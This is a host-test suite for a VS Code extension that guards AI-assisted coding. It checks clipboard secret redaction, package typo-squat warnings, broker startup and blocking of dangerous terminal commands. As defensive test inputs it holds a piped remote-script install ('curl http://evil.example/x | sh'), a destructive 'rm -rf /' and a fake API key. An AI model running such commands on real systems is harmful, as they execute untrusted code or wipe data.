/**
 * Real-user verification: EXECUTE the five buttons a user actually clicks.
 *
 * controlPanel.host.ts proves the panel renders and that every command it can
 * invoke is *registered*. Registration is not behaviour. A command can be
 * registered, appear in the palette, be listed in a passing test, and still do
 * nothing when clicked — which is precisely the failure class that shipped in
 * 0.3.0.
 *
 * So this suite drives the commands themselves. Every prompt the command shows
 * is answered by a scripted UI driver, and the assertion is on the observable
 * effect: the clipboard contents afterwards, the risk table that was rendered,
 * the broker decision that came back. Where a command does nothing useful, the
 * test says so instead of passing because the command "ran".
 *
 * Run: npm run test:host
 */

import * as assert from "assert";
import * as vscode from "vscode";

import { deriveProtectionState, type ProtectionRuntimeFacts } from "../../protection/ProtectionState";
import { ProtectionStateService } from "../../protection/ProtectionStateService";

const EXTENSION_ID = "soterai.soterai-ide-guard";

async function freePort(): Promise<number> {
    const net = await import("node:net");
    return new Promise<number>((resolve, reject) => {
        const probe = net.createServer();
        probe.once("error", reject);
        probe.listen(0, "127.0.0.1", () => {
            const address = probe.address();
            const port = typeof address === "object" && address ? address.port : 0;
            probe.close(() => (port ? resolve(port) : reject(new Error("could not obtain a free broker port"))));
        });
    });
}

/** Everything the extension tried to show the user during one command. */
interface Recorded {
    inputBoxes: Array<{ title?: string; prompt?: string }>;
    quickPicks: Array<{ title?: string; labels: string[] }>;
    info: string[];
    warn: string[];
    error: string[];
    modal: string[];
    webviews: Array<{ viewType: string; title: string; html: string }>;
    documents: string[];
}

/**
 * Answers the extension's prompts from a script and records what was asked.
 *
 * `answerInput` / `pickBy` / `answerMessage` are supplied per test. An
 * unanswered prompt resolves to undefined, which is how a real user cancelling
 * behaves — so a command that depends on an unscripted prompt fails loudly
 * rather than hanging.
 *
 * Exported for commandSweep.host.ts. The sweep must observe commands through
 * exactly the surfaces this driver stubs, or the two suites would disagree about
 * what "the user saw nothing" means.
 */
export class UiDriver {
    public readonly rec: Recorded = { inputBoxes: [], quickPicks: [], info: [], warn: [], error: [], modal: [], webviews: [], documents: [] };
    private readonly saved: Record<string, unknown> = {};

    constructor(private readonly script: {
        answerInput?: (title: string, prompt: string) => string | undefined;
        pickBy?: (labels: string[], title: string) => number | undefined;
        answerMessage?: (message: string, items: string[]) => string | undefined;
    }) {}

    public install(): void {
        const w = vscode.window as unknown as Record<string, unknown>;
        for (const key of ["showInputBox", "showQuickPick", "showInformationMessage", "showWarningMessage", "showErrorMessage", "createWebviewPanel", "showTextDocument"]) {
            this.saved[key] = w[key];
        }

        w.showInputBox = async (options?: vscode.InputBoxOptions) => {
            this.rec.inputBoxes.push({ title: options?.title, prompt: options?.prompt });
            return this.script.answerInput?.(options?.title ?? "", options?.prompt ?? "");
        };

        w.showQuickPick = async (items: readonly unknown[], options?: vscode.QuickPickOptions) => {
            const resolved = await Promise.resolve(items as never);
            const list = resolved as ReadonlyArray<string | { label: string }>;
            const labels = list.map((i) => (typeof i === "string" ? i : i.label));
            this.rec.quickPicks.push({ title: options?.title, labels });
            const index = this.script.pickBy?.(labels, options?.title ?? "");
            return index === undefined ? undefined : list[index];
        };

        // showXMessage has two shapes: (message, ...items) and
        // (message, options, ...items). Modal dialogs use the second.
        const message = (bucket: "info" | "warn" | "error") => async (text: string, ...rest: unknown[]) => {
            const isOptions = rest.length > 0 && typeof rest[0] === "object" && rest[0] !== null;
            const options = isOptions ? (rest[0] as vscode.MessageOptions) : undefined;
            const items = (isOptions ? rest.slice(1) : rest) as string[];
            this.rec[bucket].push(text);
            if (options?.modal) this.rec.modal.push(text);
            return this.script.answerMessage?.(text, items);
        };
        w.showInformationMessage = message("info");
        w.showWarningMessage = message("warn");
        w.showErrorMessage = message("error");

        w.createWebviewPanel = (viewType: string, title: string) => {
            const entry = { viewType, title, html: "" };
            this.rec.webviews.push(entry);
            return {
                viewType,
                title,
                visible: true,
                webview: {
                    set html(value: string) { entry.html = value; },
                    get html(): string { return entry.html; },
                    options: {},
                    cspSource: "vscode-webview:",
                    asWebviewUri: (uri: vscode.Uri) => uri,
                    onDidReceiveMessage: () => ({ dispose() { /* no-op */ } }),
                    postMessage: async () => true,
                },
                onDidDispose: () => ({ dispose() { /* no-op */ } }),
                onDidChangeViewState: () => ({ dispose() { /* no-op */ } }),
                reveal: () => { /* no-op */ },
                dispose: () => { /* no-op */ },
            };
        };

        // Commands that dump a report open an untitled document. Capture the
        // text instead of stealing the editor for the rest of the run.
        w.showTextDocument = async (doc: vscode.TextDocument) => {
            this.rec.documents.push(typeof doc?.getText === "function" ? doc.getText() : String(doc));
            return { document: doc } as never;
        };
    }

    public restore(): void {
        const w = vscode.window as unknown as Record<string, unknown>;
        for (const [key, value] of Object.entries(this.saved)) w[key] = value;
    }

    /** All user-visible text from one command, for substring assertions. */
    public get shown(): string {
        return [...this.rec.info, ...this.rec.warn, ...this.rec.error, ...this.rec.webviews.map((v) => v.html), ...this.rec.documents].join("\n");
    }
}

/** Run one command with a scripted UI and hand back what the user would see. */
async function drive(
    command: string,
    script: ConstructorParameters<typeof UiDriver>[0],
): Promise<{ rec: Recorded; shown: string; threw?: string }> {
    const driver = new UiDriver(script);
    driver.install();
    let threw: string | undefined;
    try {
        await vscode.commands.executeCommand(command);
    } catch (error) {
        threw = error instanceof Error ? error.message : String(error);
    } finally {
        driver.restore();
    }
    return { rec: driver.rec, shown: driver.shown, threw };
}

const ALL_ON: ProtectionRuntimeFacts = {
    enabled: true,
    broker: "healthy",
    workspaceTrusted: true,
    policy: "loaded",
    safeModeEnabled: true,
    protectedWorkspaceEnabled: true,
    sentinelEnabled: true,
    mcpStrictModeEnabled: true,
    liveScanEnabled: true,
    protectedAiTools: 0,
    detectedAiTools: 0,
};

export function run(): Promise<void> {
    return new Promise((resolve, reject) => {
        const failures: string[] = [];
        const passes: string[] = [];
        const notes: string[] = [];

        const check = (name: string, fn: () => void | Promise<void>) =>
            Promise.resolve()
                .then(fn)
                .then(() => {
                    passes.push(name);
                    console.log("  ok   " + name);
                })
                .catch((error: unknown) => {
                    const detail = error instanceof Error ? error.message : String(error);
                    failures.push(`${name}: ${detail}`);
                    console.log("  FAIL " + name + " -> " + detail);
                });

        void (async () => {
            const extension = vscode.extensions.getExtension(EXTENSION_ID);
            if (!extension) {
                reject(new Error(`${EXTENSION_ID} is not installed in the test host`));
                return;
            }
            await extension.activate();

            // The developer's normal editor may already own the default broker
            // port. This suite uses a throwaway profile, so give that profile an
            // OS-assigned port before exercising broker-backed commands.
            const hostPort = await freePort();
            await vscode.workspace
                .getConfiguration("soterai")
                .update("broker.port", hostPort, vscode.ConfigurationTarget.Global);
            notes.push(`isolated host broker port=${hostPort}`);

            // ── what the panel headline is derived from, on this real host ────
            await check("the AI-tool detector counts only real AI tools", async () => {
                const service = new ProtectionStateService(
                    { globalState: { get: () => undefined, update: async () => undefined } } as unknown as vscode.ExtensionContext,
                    {
                        brokerManager: { status: async () => ({ running: false, state: "offline" }), url: "http://127.0.0.1:8787" } as never,
                        workspaceGuard: { isEnabled: false } as never,
                        sentinel: { isEnabled: false } as never,
                    },
                );
                const { facts, descriptor } = await service.refresh();
                const census = service.censusAiTools();
                notes.push(
                    `detector on this host: detectedAiTools=${facts.detectedAiTools}, protectedAiTools=${facts.protectedAiTools}, ` +
                    `unmanagedAiTools=${facts.unmanagedAiTools}, state=${descriptor.state}, coverage="${descriptor.coverage}"`,
                );
                const ids = vscode.extensions.all.map((e) => e.id);
                notes.push(`host has ${ids.length} extensions loaded (launched with --disable-extensions)`);
                if (census.routable.length + census.unmanaged.length > 0) {
                    notes.push(`classified as AI: ${[...census.routable, ...census.unmanaged].map((c) => `${c.id} (${c.kind})`).join(", ")}`);
                }

                // This host is launched with --disable-extensions and loads no
                // third-party AI extension, so the honest answer is zero. The
                // old substring classifier reported 3 here — SoterAI's own id
                // and two built-ins whose descriptions contain "ai".
                assert.strictEqual(
                    facts.detectedAiTools, 0,
                    `no AI extension is loaded in this host, but the detector claims ${facts.detectedAiTools}: ` +
                    census.routable.map((c) => `${c.id} — ${c.reason}`).join("; "),
                );
                assert.strictEqual(
                    facts.unmanagedAiTools, 0,
                    `no AI extension is loaded, but ${facts.unmanagedAiTools} were classified as unmanaged: ` +
                    census.unmanaged.map((c) => `${c.id} — ${c.reason}`).join("; "),
                );
                // And SoterAI must never appear in its own census.
                assert.ok(
                    ![...census.routable, ...census.unmanaged].some((c) => c.id === EXTENSION_ID),
                    "SoterAI counted itself as an AI tool it does not protect",
                );
            });

            await check("Fully enforced is reachable, and an inflated count no longer forces an error", () => {
                // Before the fix, countVerifiedBrokerRoutes() scanned six config
                // paths so protectedAiTools could never exceed 6, while the
                // detector counted 32 — permanently BYPASS_DETECTED whatever the
                // user switched on. Both halves are now asserted.
                const reachable = deriveProtectionState({ ...ALL_ON, detectedAiTools: 1, protectedAiTools: 1, unmanagedAiTools: 0 });
                assert.strictEqual(
                    reachable.state, "FULLY_ENFORCED",
                    `everything on and the single routable tool routed should be green, got ${reachable.state}`,
                );

                // Real AI tools SoterAI cannot route must degrade the claim to a
                // warning that names the limit — never a red bypass error.
                const withCopilot = deriveProtectionState({ ...ALL_ON, detectedAiTools: 1, protectedAiTools: 1, unmanagedAiTools: 31 });
                assert.notStrictEqual(withCopilot.state, "BYPASS_DETECTED", "an unroutable tool is not a bypass");
                assert.strictEqual(withCopilot.severity, "warning", `expected a warning, got ${withCopilot.severity}`);
                assert.match(withCopilot.coverage, /31 other AI tools cannot be routed/i);

                // A genuine bypass — a routable tool left unrouted — is still an error.
                const realBypass = deriveProtectionState({ ...ALL_ON, detectedAiTools: 2, protectedAiTools: 1 });
                assert.strictEqual(realBypass.state, "BYPASS_DETECTED", "a real unrouted integration must still be an error");
            });

            // ── button 1: Check what I copied ────────────────────────────────
            await check("Check what I copied really finds a secret and really redacts the clipboard", async () => {
                const original = await vscode.env.clipboard.readText();
                try {
                    await vscode.env.clipboard.writeText("OPENAI_API_KEY=sk-proj-1234567890abcdefghijklmnopqrstuv");
                    const result = await drive("soterai.scanClipboard", {
                        answerMessage: (_text, items) => items.find((i) => i.startsWith("Replace Clipboard")),
                    });
                    assert.strictEqual(result.threw, undefined, `command threw: ${result.threw}`);
                    assert.ok(
                        result.rec.warn.length > 0,
                        `a clipboard holding an API key produced no warning at all (info=${JSON.stringify(result.rec.info)})`,
                    );
                    const after = await vscode.env.clipboard.readText();
                    assert.ok(
                        !after.includes("sk-proj-1234567890abcdefghijklmnopqrstuv"),
                        "the user accepted 'Replace Clipboard with Safe Version' and the raw key is still on the clipboard",
                    );
                    notes.push(`clipboard warning: ${result.rec.warn[0]}`);
                } finally {
                    await vscode.env.clipboard.writeText(original);
                }
            });

            await check("Check what I copied does not cry wolf over ordinary text", async () => {
                const original = await vscode.env.clipboard.readText();
                try {
                    await vscode.env.clipboard.writeText("const total = items.reduce((a, b) => a + b, 0);");
                    const result = await drive("soterai.scanClipboard", { answerMessage: () => undefined });
                    assert.strictEqual(result.rec.warn.length, 0, `plain code was flagged: ${result.rec.warn.join(" | ")}`);
                    assert.ok(result.rec.info.length > 0, "a clean clipboard produced no feedback at all");
                } finally {
                    await vscode.env.clipboard.writeText(original);
                }
            });

            // ── button 3: Check a package before installing ──────────────────
            await check("Check a package before installing really flags a typo-squat", async () => {
                const result = await drive("soterai.checkDependencyInstall", {
                    answerInput: () => "npm install expres",
                    pickBy: (labels) => labels.findIndex((l) => /heuristics only/i.test(l)),
                });
                assert.strictEqual(result.threw, undefined, `command threw: ${result.threw}`);
                assert.ok(result.rec.inputBoxes.length > 0, "the command never asked for a package");
                assert.ok(
                    /expres/.test(result.shown),
                    `a classic typo-squat produced no finding. shown: ${result.shown.slice(0, 400)}`,
                );
                notes.push(`dep-guard rendered ${result.rec.webviews.length} report(s) for "npm install expres"`);
            });

            await check("Check a package before installing really flags a piped-shell install", async () => {
                const result = await drive("soterai.checkDependencyInstall", {
                    answerInput: () => "curl http://evil.example/x | sh",
                    pickBy: (labels) => labels.findIndex((l) => /heuristics only/i.test(l)),
                });
                assert.ok(
                    result.rec.webviews.length > 0 || /risk/i.test(result.shown),
                    `curl | sh was reported as clean. shown: ${result.shown.slice(0, 300)}`,
                );
            });

            // ── button 5: Set up local checking (the panel's primary CTA) ────
            await check("Set up local checking really starts local checking in a workspace with no AI config", async () => {
                // Dismiss the follow-up rather than picking an option, so the
                // assertion is about what the command ACHIEVED, not about the
                // buttons it offered. ("Copy broker URL" would also clobber the
                // developer's clipboard.)
                const result = await drive("soterai.setupBrokerIntegration", {
                    pickBy: () => 0,
                    answerMessage: () => undefined,
                });
                assert.strictEqual(result.threw, undefined, `command threw: ${result.threw}`);
                notes.push(`setupBroker said: ${[...result.rec.info, ...result.rec.warn, ...result.rec.error].join(" | ") || "(nothing)"}`);

                // The panel bills this as "Needed before SoterAI can block
                // anything", and while the broker is stopped it is the single
                // primary CTA. It used to return early with "No AI client config
                // found" without starting anything, so the most important button
                // in the product was a dead end.
                //
                // Assert the outcome, not the wording: take the URL the command
                // reported and talk to the broker's unauthenticated /health.
                // Anything less would pass on a message that lies. (The module
                // singleton getBrokerManager() is not usable here — this suite is
                // bundled separately from dist/extension.js, so it would see its
                // own empty copy of that module.)
                const said = result.rec.info.join(" | ");
                assert.ok(
                    /local checking is on/i.test(said),
                    `the primary CTA did not report starting local checking: ${said || "(nothing shown)"}`,
                );
                const url = /https?:\/\/127\.0\.0\.1:\d+/.exec(said)?.[0];
                assert.ok(url, `no broker URL was reported to the user: ${said}`);
                const health = await fetch(`${url}/health`);
                assert.ok(
                    health.status >= 200 && health.status < 300,
                    `the command claimed local checking is on, but ${url}/health returned HTTP ${health.status}`,
                );
                notes.push(`broker after setup CTA: ${url}/health -> HTTP ${health.status}`);
            });

            // ── button 2: Run a command safely (real broker, real decision) ──
            await check("Run a command safely really blocks a destructive command", async () => {
                const result = await drive("soterai.runControlledTerminalCommand", {
                    answerInput: () => "rm -rf /",
                    answerMessage: (_t, items) => items.find((i) => i === "Run"),
                });
                assert.strictEqual(result.threw, undefined, `command threw: ${result.threw}`);
                assert.ok(
                    result.rec.warn.some((m) => /blocked this command/i.test(m)),
                    `"rm -rf /" was not blocked. shown: ${result.shown.slice(0, 400)}`,
                );
                assert.ok(
                    result.rec.documents.length === 0,
                    "a blocked command still produced an execution report",
                );
                notes.push(`controlled terminal on "rm -rf /": ${result.rec.warn.join(" | ")}`);
            });

            await check("Run a command safely really runs an approved read-only command", async () => {
                const result = await drive("soterai.runControlledTerminalCommand", {
                    answerInput: () => "git status --short",
                    answerMessage: (_t, items) => items.find((i) => i === "Run"),
                });
                assert.strictEqual(result.threw, undefined, `command threw: ${result.threw}`);
                assert.ok(
                    result.rec.documents.length > 0,
                    `an allowed read-only command produced no execution report. warn=${JSON.stringify(result.rec.warn)}`,
                );
                assert.match(result.rec.documents[0] ?? "", /decision=ALLOW/, "the report did not record an ALLOW decision");
                notes.push(`controlled terminal on "git status --short": ${(result.rec.documents[0] ?? "").split("\n").slice(0, 4).join(" / ")}`);
            });

            // ── button 4: Check an agent tool before it runs ─────────────────
            await check("Check an agent tool before it runs reports something a user can act on", async () => {
                const result = await drive("soterai.preflightMCPTool", {
                    pickBy: () => 0,
                    answerInput: () => "{}",
                    answerMessage: (_t, items) => items[0],
                });
                assert.strictEqual(result.threw, undefined, `command threw: ${result.threw}`);
                const said = [...result.rec.info, ...result.rec.warn, ...result.rec.error].join(" | ");
                notes.push(`mcp preflight said: ${said || "(nothing)"}`);
                assert.ok(said.length > 0 || result.rec.webviews.length > 0, "the command produced no output at all");
            });

            // ── the toggles, for real ────────────────────────────────────────
            await check("Keep a record of AI activity toggles the real setting on and off", async () => {
                const driver = new UiDriver({ answerMessage: (_t, items) => items[0], pickBy: () => 0 });
                driver.install();
                try {
                    await vscode.commands.executeCommand("soterai.enableAISentinel");
                    await vscode.commands.executeCommand("soterai.disableAISentinel");
                } finally {
                    driver.restore();
                }
            });

            await check("Emergency lockdown engages and unlock releases it", async () => {
                const lock = await drive("soterai.emergencyLockdown", { answerMessage: (_t, items) => items[0] ?? undefined });
                notes.push(`lockdown said: ${[...lock.rec.warn, ...lock.rec.info, ...lock.rec.error].join(" | ") || "(nothing)"}`);
                const unlock = await drive("soterai.unlockProtection", { answerMessage: (_t, items) => items[0] ?? undefined, answerInput: () => "UNLOCK" });
                notes.push(`unlock said: ${[...unlock.rec.warn, ...unlock.rec.info, ...unlock.rec.error].join(" | ") || "(nothing)"}`);
                assert.strictEqual(lock.threw, undefined, `lockdown threw: ${lock.threw}`);
                assert.strictEqual(unlock.threw, undefined, `unlock threw: ${unlock.threw}`);
            });

            // ── the control that is ON by default ────────────────────────────
            await check("Warn me about secrets as I type really puts a warning in the editor", async () => {
                const folder = vscode.workspace.workspaceFolders?.[0];
                assert.ok(folder, "the test host opened no workspace folder");
                const file = vscode.Uri.joinPath(folder!.uri, "leaky.ts");
                await vscode.workspace.fs.writeFile(
                    file,
                    Buffer.from('export const key = "sk-proj-1234567890abcdefghijklmnopqrstuv";\n', "utf8"),
                );
                const doc = await vscode.workspace.openTextDocument(file);
                await vscode.window.showTextDocument(doc, { preview: false });
                let found: vscode.Diagnostic[] = [];
                for (let i = 0; i < 150; i++) {
                    found = vscode.languages.getDiagnostics(file).filter((d) => String(d.source ?? "").toLowerCase().includes("soterai"));
                    if (found.length > 0) break;
                    await new Promise((r) => setTimeout(r, 100));
                }
                notes.push(`live scan produced ${found.length} diagnostic(s): ${found.map((d) => d.message).slice(0, 2).join(" | ")}`);
                assert.ok(
                    found.length > 0,
                    "an API key sitting in an open .ts file produced no editor warning, though the control is on by default",
                );
            });

            // ── the headline control: does 'blocked' mean blocked? ───────────
            await check("Block risky AI requests really blocks a secret on the brokered path", async () => {
                const enable = await drive("soterai.enableAISafeMode", {
                    pickBy: (labels) => labels.findIndex((l) => l === "developer"),
                    answerMessage: (_t, items) => items[0],
                });
                assert.strictEqual(enable.threw, undefined, `enabling Safe Mode threw: ${enable.threw}`);

                // testBrokerProtection throws unless the broker actually
                // refused or redacted a planted key. That is the enforcement
                // claim behind the ENFORCED badge, executed rather than read.
                const selfTest = await drive("soterai.testBrokerProtection", { answerMessage: (_t, items) => items[0] });
                notes.push(`broker self-test: ${selfTest.threw ? "THREW " + selfTest.threw : selfTest.rec.info.join(" | ")}`);
                assert.strictEqual(selfTest.threw, undefined, `the broker failed to protect a planted API key: ${selfTest.threw}`);
                assert.ok(
                    selfTest.rec.info.some((m) => /self-test passed/i.test(m)),
                    `the self-test reported no pass: ${selfTest.rec.info.join(" | ")}`,
                );
            });

            // ── the banner the user is looking at, and its own CTA ───────
            await check("See what is wrong explains the problem the banner is reporting", async () => {
                // This command is the primary button the Control Panel shows
                // when the headline banner needs attention. The original defect:
                // the page it opened was a static route table that never named
                // the actual problem, so the error's own call to action did not
                // address the error. The fix renders the LIVE state headline —
                // title, explanation and recommended action — so the page and
                // the banner must always agree.
                const result = await drive("soterai.showCoverageMatrix", { answerMessage: (_t, items) => items[0] });
                const html = result.rec.webviews.map((v) => v.html).join("\n");
                assert.ok(html.length > 0, "the CTA rendered nothing");
                // Every webview carries a Content-Security-Policy meta tag, so
                // a bare /policy/i match passes on the CSP header alone. Strip
                // the document chrome first: the question is whether the BODY
                // tells the user what is wrong.
                const body = html.replace(/<meta[^>]*>/gi, "").replace(/<style[\s\S]*?<\/style>/gi, "");
                // The page must carry the LIVE headline the banner is showing
                // — not a static table. showCoverageMatrix renders the
                // state title, explanation and recommended action resolved at
                // click time, so the page and the banner cannot disagree.
                assert.ok(
                    /What to do about it/i.test(body),
                    "the page states no problem and offers no recommended action",
                );
                const headline = /<h1>([^<]+)<\/h1>/.exec(body)?.[1];
                assert.ok(headline && headline.trim().length > 0, "the page never names the problem the banner is reporting");
                const action = /<strong>([^<]+)<\/strong>/.exec(body)?.[1];
                assert.ok(
                    action && action.trim().length > 0,
                    `the page names the problem ("${headline}") but offers no recommended action`,
                );
                assert.ok(
                    /coverage right now/i.test(body),
                    "the page does not report the live coverage the banner is claiming",
                );
                // The page's own headline must be one of the honest protection
                // states — a hard-coded route table renders no h1 at all.
                assert.ok(
                    /Monitoring only|Partially enforced|Fully enforced|Bypass detected|Broker offline|Policy file missing|Restricted workspace|Protection error|Emergency Lockdown/i.test(headline!),
                    `the page headline is not a protection state: "${headline}"`,
                );
            });

            await check("clearing the policy leaves no error behind", async () => {
                const service = () => new ProtectionStateService(
                    { globalState: { get: () => undefined, update: async () => undefined } } as unknown as vscode.ExtensionContext,
                    {
                        brokerManager: { status: async () => ({ running: false, state: "offline" }), url: "http://127.0.0.1:8787" } as never,
                        workspaceGuard: { isEnabled: false } as never,
                        sentinel: { isEnabled: false } as never,
                    },
                );
                const before = (await service().refresh()).descriptor;
                const created = await drive("soterai.createProjectPolicy", { answerMessage: (_t, items) => items.find((i) => i === "Overwrite") });
                assert.strictEqual(created.threw, undefined, `creating the policy threw: ${created.threw}`);
                const after = (await service().refresh()).descriptor;
                notes.push(
                    `state before createProjectPolicy=${before.state} (${before.severity}), ` +
                    `after=${after.state} (${after.severity}) — "${after.title}"`,
                );
                // A fresh workspace with no enforcement switched on must not
                // start on the red banner at all: the service auto-creates the
                // default policy (ESLint-style) so the honest headline is
                // MONITORING_ONLY, never POLICY_UNAVAILABLE, until the user
                // actually turns on an enforcement path.
                assert.strictEqual(before.state, "MONITORING_ONLY", "the fresh workspace must not start on a red error banner");
                assert.notEqual(before.severity, "error", `a fresh workspace was shown as an error: ${before.explanation}`);
                assert.notEqual(before.severity, "critical", `unexpected critical state on a fresh workspace: ${before.explanation}`);
                assert.notStrictEqual(after.state, "POLICY_UNAVAILABLE", "creating the default policy did not clear the banner");
                // The original defect: fixing the policy simply swapped
                // POLICY_UNAVAILABLE for BYPASS_DETECTED, both severity "error".
                // Doing the work the product asked for has to actually pay off.
                assert.notStrictEqual(
                    after.severity, "error",
                    `doing what the product asked for produced another red error: ${after.state} — ${after.explanation}`,
                );
                assert.notStrictEqual(after.severity, "critical", `unexpected critical state: ${after.state}`);
            });

            // ── the second editor: someone else already holds our port ───────
            //
            // Two editors with SoterAI installed — VS Code and Cursor, say — is
            // an ordinary setup, and the second one always lands here: each
            // editor keeps its own broker token, so neither can use the other's
            // broker. The old code spawned a process that could not possibly
            // bind, waited out a 3-second deadline, and reported "Local AI
            // Broker did not become ready" with no cause and no way forward.
            // Worse, it overwrote its own child reference on the way, orphaning
            // the broker it already owned: still holding the port, no longer
            // stoppable, outliving the editor.
            await check("starting while another process holds the port says so, instead of timing out", async () => {
                const port = vscode.workspace.getConfiguration("soterai").get<number>("broker.port", 47321);
                await drive("soterai.stopLocalAIBroker", {});

                // A foreign occupant, not a broker: it answers, but it is not
                // ours and has none of our endpoints.
                const http = await import("node:http");
                const squatter = http.createServer((_req, res) => { res.writeHead(404); res.end("not the broker"); });
                await new Promise<void>((ok, fail) => {
                    let attempts = 0;
                    const tryListen = (): void => {
                        squatter.once("error", (err: NodeJS.ErrnoException) => {
                            // The broker we just stopped can hold the listener a
                            // moment longer on Windows.
                            if (err.code === "EADDRINUSE" && attempts++ < 20) return void setTimeout(tryListen, 100);
                            fail(err);
                        });
                        squatter.listen(port, "127.0.0.1", () => ok());
                    };
                    tryListen();
                });

                try {
                    const startedAt = Date.now();
                    const blocked = await drive("soterai.startLocalAIBroker", {});
                    const elapsed = Date.now() - startedAt;
                    notes.push(`start with port ${port} occupied: ${elapsed}ms — ${blocked.threw ?? "(no error)"}`);
                    assert.ok(blocked.threw, `starting on an occupied port reported success. shown: ${blocked.shown.slice(0, 300)}`);
                    assert.match(blocked.threw, /already in use/i, `the error does not name the real cause: ${blocked.threw}`);
                    // An error a user cannot act on is barely better than a
                    // timeout, so the setting that fixes it has to be in the text.
                    assert.match(blocked.threw, /soterai\.broker\.port/, `the error offers no way forward: ${blocked.threw}`);
                    // The old path burned the full 30-attempt deadline (measured
                    // 3.31–3.51s across 13 commands in the sweep) before saying
                    // nothing useful. This must not spawn anything at all.
                    assert.ok(elapsed < 2500, `the port conflict took ${elapsed}ms — it is still waiting out the startup deadline`);
                } finally {
                    await new Promise<void>((ok) => squatter.close(() => ok()));
                }

                // And the refusal must not be sticky: with the port free again,
                // the same button has to work.
                const recovered = await drive("soterai.startLocalAIBroker", {});
                assert.strictEqual(recovered.threw, undefined, `the broker would not start after the port was freed: ${recovered.threw}`);
                const health = await fetch(`http://127.0.0.1:${port}/health`);
                assert.ok(health.status >= 200 && health.status < 300, `broker unhealthy after recovery: HTTP ${health.status}`);
                notes.push(`start after the port was freed: HTTP ${health.status} on /health`);
            });

            // ── the editor's own polling must not lock it out of its broker ───
            //
            // Every /health, /version and /v1/safe-mode/status used to be charged
            // against one 120/minute budget, and the only client polling those is
            // this extension: a status check costs 2 requests, the idle heartbeat
            // 24 a minute, one start up to 60. So the extension DoS'd itself, the
            // broker answered 429, and the extension read that as "no broker is
            // running" — the trigger for the orphaning above.
            await check("the broker survives the extension's own polling volume", async () => {
                const port = vscode.workspace.getConfiguration("soterai").get<number>("broker.port", 47321);
                const url = `http://127.0.0.1:${port}`;
                await drive("soterai.startLocalAIBroker", {});
                const statuses: number[] = [];
                for (let i = 0; i < 150; i++) statuses.push((await fetch(`${url}/health`)).status);
                const refused = statuses.filter((s) => s === 429).length;
                notes.push(`150 liveness probes in one minute: ${refused} refused (429)`);
                assert.strictEqual(refused, 0, `${refused} of 150 liveness probes were rate limited — the client is still its own attacker`);

                // And the extension's own view of the broker has to agree: the
                // symptom users saw was a live broker reported as stopped.
                const shown = await drive("soterai.showBrokerStatus", {});
                assert.ok(
                    shown.rec.info.some((m) => /broker running/i.test(m)),
                    `after polling, the extension reports its own live broker as: ${shown.rec.info.join(" | ") || shown.threw}`,
                );
            });

            console.log("\n--- observed on this host ---");
            for (const note of notes) console.log("  · " + note);
            console.log(`\n${passes.length} passed, ${failures.length} failed`);
            if (failures.length > 0) {
                reject(new Error(`${failures.length} real-user host test(s) failed:\n  ` + failures.join("\n  ")));
            } else {
                resolve();
            }
        })().catch(reject);
    });
}
